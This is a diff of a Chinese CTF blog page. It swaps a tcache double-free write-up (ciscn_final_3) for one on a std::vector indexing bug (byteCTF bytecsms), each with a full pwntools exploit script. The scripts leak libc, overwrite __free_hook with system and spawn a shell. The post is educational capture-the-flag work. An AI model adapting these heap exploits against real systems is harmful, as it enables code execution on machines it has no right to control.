@@ -20,22 +20,21 @@
     var CONFIG = {"hostname":"scardow.github.io","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"right","width":240,"display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"flat"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="通过一个国赛的题目学习tcache利用">
+  <meta name="description" content="我C，嘉嘉！！！然然带我走吧，别让我做C++">
 <meta property="og:type" content="article">
-<meta property="og:title" content="tcache_pthread">
-<meta property="og:url" content="https://scardow.github.io/2021/10/30/tcache/index.html">
+<meta property="og:title" content="C++PWN中vector容器数据结构的利用">
+<meta property="og:url" content="https://scardow.github.io/2021/10/31/C-pwn/index.html">
 <meta property="og:site_name" content="Scardow&#39;s blog">
-<meta property="og:description" content="通过一个国赛的题目学习tcache利用">
+<meta property="og:description" content="我C，嘉嘉！！！然然带我走吧，别让我做C++">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2021-10-30T05:35:21.000Z">
-<meta property="article:modified_time" content="2021-10-30T05:45:43.134Z">
+<meta property="article:published_time" content="2021-10-31T15:26:28.000Z">
+<meta property="article:modified_time" content="2021-10-31T15:51:27.971Z">
 <meta property="article:author" content="Scarce Shadow">
-<meta property="article:tag" content="PWN">
-<meta property="article:tag" content="Heap exploition">
-<meta property="article:tag" content="Tcache">
+<meta property="article:tag" content="C++PWN">
+<meta property="article:tag" content="heap">
 <meta name="twitter:card" content="summary">
 
-<link rel="canonical" href="https://scardow.github.io/2021/10/30/tcache/">
+<link rel="canonical" href="https://scardow.github.io/2021/10/31/C-pwn/">
 
 
 <script id="page-configurations">
@@ -48,7 +47,7 @@
   };
 </script>
 
-  <title>tcache_pthread | Scardow's blog</title>
+  <title>C++PWN中vector容器数据结构的利用 | Scardow's blog</title>
   
 
 
@@ -161,7 +160,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://scardow.github.io/2021/10/30/tcache/">
+    <link itemprop="mainEntityOfPage" href="https://scardow.github.io/2021/10/31/C-pwn/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/picture.jpg">
@@ -174,7 +173,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          tcache_pthread
+          C++PWN中vector容器数据结构的利用
         </h1>
 
         <div class="post-meta">
@@ -187,7 +186,7 @@
               <span class="post-meta-item-text">Posted on</span>
               
 
-              <time title="Created: 2021-10-30 13:35:21 / Modified: 13:45:43" itemprop="dateCreated datePublished" datetime="2021-10-30T13:35:21+08:00">2021-10-30</time>
+              <time title="Created: 2021-10-31 23:26:28 / Modified: 23:51:27" itemprop="dateCreated datePublished" datetime="2021-10-31T23:26:28+08:00">2021-10-31</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -195,7 +194,7 @@
               </span>
               <span class="post-meta-item-text">In</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/learning/" itemprop="url" rel="index"><span itemprop="name">learning</span></a>
+                  <a href="/categories/writeup/" itemprop="url" rel="index"><span itemprop="name">writeup</span></a>
                 </span>
             </span>
 
@@ -215,8 +214,8 @@
       </span>
       <span class="post-meta-item-text">Valine: </span>
     
-    <a title="valine" href="/2021/10/30/tcache/#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/2021/10/30/tcache/" itemprop="commentCount"></span>
+    <a title="valine" href="/2021/10/31/C-pwn/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2021/10/31/C-pwn/" itemprop="commentCount"></span>
     </a>
   </span>
   
@@ -226,14 +225,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">Symbols count in article: </span>
-              <span>1.8k</span>
+              <span>2.9k</span>
             </span>
             <span class="post-meta-item" title="Reading time">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">Reading time &asymp;</span>
-              <span>2 mins.</span>
+              <span>3 mins.</span>
             </span>
 
         </div>
@@ -245,23 +244,23 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <p>通过一个国赛的题目学习tcache利用</p>
+        <p>我C，嘉嘉！！！然然带我走吧，别让我做C++</p>
 <span id="more"></span>
 
-<h1 id="Tcache-pthread利用"><a href="#Tcache-pthread利用" class="headerlink" title="Tcache_pthread利用"></a>Tcache_pthread利用</h1><h2 id="ciscn-final-3"><a href="#ciscn-final-3" class="headerlink" title="ciscn_final_3"></a>ciscn_final_3</h2><p>C++程序，逻辑很简单，只能分配(次数：0x18)和释放(UAF)，没有修改与输出，只有分配时提供堆块地址，原题提供libc-2.27，tcache无double free检查，题使用加入检查的2.27版本</p>
+<h1 id="C-PWN中vector的利用"><a href="#C-PWN中vector的利用" class="headerlink" title="C++PWN中vector的利用"></a>C++PWN中vector的利用</h1><p>题目byteCTF-bytecsms，过了好几周才想起来复现，我是懒狗。参考了eqqie师傅的思路，并且学习了C++的技巧</p>
 <ul>
-<li><p>将tcache填满，加入两个fastbin进行double free，获得0x250的tcachebin，并修改0x250的bins数量，使之进入unsorted bin</p>
-</li>
-<li><p>伪造tcache next使得 tcache下一次可以拿到libc上的一个地址 </p>
-</li>
-<li><p>劫持free_hook，tcache没有有关检查，可以轻松拿到free_hook</p>
-</li>
+<li>题目漏洞在于vector计数漏洞，remove时会删去所有相同名字的元素，而bss_num仅仅减少1，而索引时通过bss_num索引，这就导致了越界访问</li>
+<li>通过大量添加元素使得vector大小达到128k，（实际调试时大于128k，这里还不明所以，改日一定去请教eqqie师傅，），这时通过edit一个可读可写的地址泄露libc，这里应该原样填回，否则会crash。同样道理，修改free_hook。我发现一个有意思的地方，可以省去一小步，虽然并没有什么巨大效果，就是在输入score时输入一个字母可以直接被忽略而避免修改重要内容</li>
+<li>最后，upload使该vector重新分配，此时会调用free</li>
 </ul>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">p = process(<span class="string">&quot;./ciscn_final_3_hard&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">choise:<span class="built_in">int</span></span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(choise))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx:<span class="built_in">int</span>, size:<span class="built_in">int</span>, context</span>):</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;index&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;size&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;something&quot;</span>)</span><br><span class="line">    p.send(context)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;gift :&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(p.recvline()[:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span>(<span class="params">idx:<span class="built_in">int</span></span>):</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;index&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">heap = add(<span class="number">0</span>, <span class="number">0x70</span>, <span class="string">b&quot;a&quot;</span>*<span class="number">0x10</span>) - <span class="number">0x11e70</span></span><br><span class="line"><span class="comment"># fill tcache 0x70</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">9</span>):</span><br><span class="line">    add(i, <span class="number">0x70</span>, <span class="string">b&quot;a&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    remove(i)</span><br><span class="line"><span class="comment"># double free chunk7</span></span><br><span class="line">remove(<span class="number">7</span>)</span><br><span class="line"><span class="comment"># empty tcache</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>, <span class="number">16</span>):</span><br><span class="line">    add(i, <span class="number">0x70</span>, <span class="string">b&quot;b&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fastbin move 2 tcache!!!</span></span><br><span class="line">fake = heap + <span class="number">0x10</span></span><br><span class="line">add(<span class="number">16</span>, <span class="number">0x70</span>, p64(fake))</span><br><span class="line">add(<span class="number">17</span>, <span class="number">0x70</span>, <span class="string">b&quot;b&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">18</span>, <span class="number">0x70</span>, <span class="string">b&quot;b&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="comment"># fake tcachebin </span></span><br><span class="line"><span class="comment"># 0x250 : 0x7 </span></span><br><span class="line">add(<span class="number">19</span>, <span class="number">0x70</span>, <span class="string">b&quot;\x00&quot;</span>*(<span class="number">0x25</span>-<span class="number">0x2</span>)+<span class="string">b&quot;\x07&quot;</span>)</span><br><span class="line"><span class="comment"># move2unsortedbin</span></span><br><span class="line">remove(<span class="number">19</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># unsorted bin fd &lt;=&gt; fake tcache 0x20</span></span><br><span class="line">add(<span class="number">20</span>, <span class="number">0x50</span>, <span class="string">b&quot;\x07&quot;</span>*<span class="number">0x40</span>+p64(fake+<span class="number">0x60</span>))</span><br><span class="line">leak = add(<span class="number">21</span>, <span class="number">0x50</span>, p64(fake))</span><br><span class="line">libc = leak - <span class="number">0x3ebca0</span></span><br><span class="line">one_gadget = libc + <span class="number">0xe569f</span></span><br><span class="line">system = libc + <span class="number">0x4f550</span></span><br><span class="line">malloc_hook = libc + <span class="number">0x3ebc30</span></span><br><span class="line">free_hook = libc + <span class="number">0x3ed8e8</span></span><br><span class="line">add(<span class="number">22</span>, <span class="number">0x10</span>, p64(free_hook))</span><br><span class="line">add(<span class="number">23</span>, <span class="number">0x50</span>, p64(system))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">add(<span class="number">24</span>, <span class="number">0x10</span>, <span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">remove(<span class="number">24</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">p.sendafter(<span class="string">b&quot;Password for admin:\n&quot;</span>, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">if</span> p.recv(<span class="number">9</span>) == <span class="string">b&quot;Incorrect&quot;</span>:</span><br><span class="line">        p.sendafter(<span class="string">b&quot;Password for admin:\n&quot;</span>, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">choise: <span class="built_in">int</span></span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(choise).encode())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">name, scores: <span class="built_in">int</span></span>):</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;name:&quot;</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;scores&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(scores).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;return&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;4869&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span>(<span class="params">way: <span class="built_in">str</span>, name_or_index</span>):</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;index&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;name&quot;</span> == way:</span><br><span class="line">        p.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">        p.recvuntil(<span class="string">&quot;deleted&quot;</span>)</span><br><span class="line">        p.sendline(name_or_index)</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&quot;index&quot;</span> == way:</span><br><span class="line">        p.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">        p.recvuntil(<span class="string">b&quot;Index?&quot;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(name_or_index).encode())</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">way: <span class="built_in">str</span>, name_or_index, new_name, new_score: <span class="built_in">int</span></span>):</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;name&quot;</span> == way:</span><br><span class="line">        p.recvuntil(<span class="string">b&quot;index&quot;</span>)</span><br><span class="line">        p.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">        p.recvuntil(<span class="string">b&quot;edit&quot;</span>)</span><br><span class="line">        p.sendline(name_or_index)</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&quot;index&quot;</span> == way:</span><br><span class="line">        p.recvuntil(<span class="string">b&quot;index&quot;</span>)</span><br><span class="line">        p.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">        p.recvuntil(<span class="string">b&quot;Index?&quot;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(name_or_index).encode())</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">b&quot;name:&quot;</span>)</span><br><span class="line">    p.sendline(new_name)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;score:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(new_score).encode())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span>():</span></span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">download</span>():</span></span><br><span class="line">    cmd(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span>():</span></span><br><span class="line">    cmd(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p *$rebase(0x207280)</span></span><br><span class="line"><span class="comment"># leak 237568</span></span><br><span class="line"><span class="comment"># free 238513</span></span><br><span class="line">add(<span class="string">b&quot;/bin/sh&quot;</span>, <span class="number">0x1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x2100</span>-<span class="number">1</span>):</span><br><span class="line">    add(<span class="string">b&quot;/bin/sh\x00&quot;</span>, <span class="number">0x1</span>)</span><br><span class="line">upload()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    remove(<span class="string">&quot;name&quot;</span>, <span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">    download()</span><br><span class="line"></span><br><span class="line">offset_mmap_libc = <span class="number">0x1d7000</span></span><br><span class="line">offser_free = <span class="number">0x1eeb28</span></span><br><span class="line"></span><br><span class="line">cmd(<span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;2.Edit by index\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Index?\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;237568&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;237568\x09&quot;</span>)</span><br><span class="line">libc_leak = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">p.sendline(p64(libc_leak))</span><br><span class="line">p.recvuntil(<span class="string">b&quot;score:\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line">libc = libc_leak - <span class="number">4160432</span>-<span class="number">151552</span></span><br><span class="line">system = libc + <span class="number">0x55410</span></span><br><span class="line">success(<span class="string">&quot;libc_leak &quot;</span>+<span class="built_in">hex</span>(libc))</span><br><span class="line"></span><br><span class="line">edit(<span class="string">&quot;index&quot;</span>, <span class="number">238513</span>, <span class="string">b&quot;a&quot;</span>*<span class="number">8</span>+p32(system&amp;<span class="number">0xffffffff</span>), system&gt;&gt;<span class="number">32</span>)</span><br><span class="line">remove(<span class="string">&quot;name&quot;</span>, <span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<h2 id="踩坑记录"><a href="#踩坑记录" class="headerlink" title="踩坑记录"></a>踩坑记录</h2><ul>
-<li>由于tcache stash 机制，fast bin中bins会全部进入tcache，而tcache指针指向位置比fastbin 多了0x10</li>
-<li>tcache count一定得控制好，否则会莫名奇妙的crash</li>
+
+
+<h3 id="踩坑记录"><a href="#踩坑记录" class="headerlink" title="踩坑记录"></a>踩坑记录</h3><ul>
+<li>在io时卡住，这是在应该克服</li>
+<li>修改free_hook时，由于偏移，只能通过修改一半name，一半score，在输入score时，误输入了p32，而应该直接输入整数</li>
+<li>进入mmap的大小大于128k，待解决</li>
 </ul>
 
     </div>
@@ -272,9 +271,8 @@
 
       <footer class="post-footer">
           <div class="post-tags">
-              <a href="/tags/PWN/" rel="tag"># PWN</a>
-              <a href="/tags/Heap-exploition/" rel="tag"># Heap exploition</a>
-              <a href="/tags/Tcache/" rel="tag"># Tcache</a>
+              <a href="/tags/C-PWN/" rel="tag"># C++PWN</a>
+              <a href="/tags/heap/" rel="tag"># heap</a>
           </div>
 
           <script type="text/javascript">
@@ -339,13 +337,10 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2021/08/17/Heap%20Exploitation/" rel="prev" title="Heap Exploitation">
-      <i class="fa fa-chevron-left"></i> Heap Exploitation
+    <a href="/2021/10/30/tcache/" rel="prev" title="tcache_pthread">
+      <i class="fa fa-chevron-left"></i> tcache_pthread
     </a></div>
-      <div class="post-nav-item">
-    <a href="/2021/10/31/C-pwn/" rel="next" title="C++PWN中vector容器数据结构的利用">
-      C++PWN中vector容器数据结构的利用 <i class="fa fa-chevron-right"></i>
-    </a></div>
+      <div class="post-nav-item"></div>
     </div>
       </footer>
     
@@ -405,7 +400,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Tcache-pthread%E5%88%A9%E7%94%A8"><span class="nav-text">Tcache_pthread利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ciscn-final-3"><span class="nav-text">ciscn_final_3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95"><span class="nav-text">踩坑记录</span></a></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#C-PWN%E4%B8%ADvector%E7%9A%84%E5%88%A9%E7%94%A8"><span class="nav-text">C++PWN中vector的利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95"><span class="nav-text">踩坑记录</span></a></li></ol></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
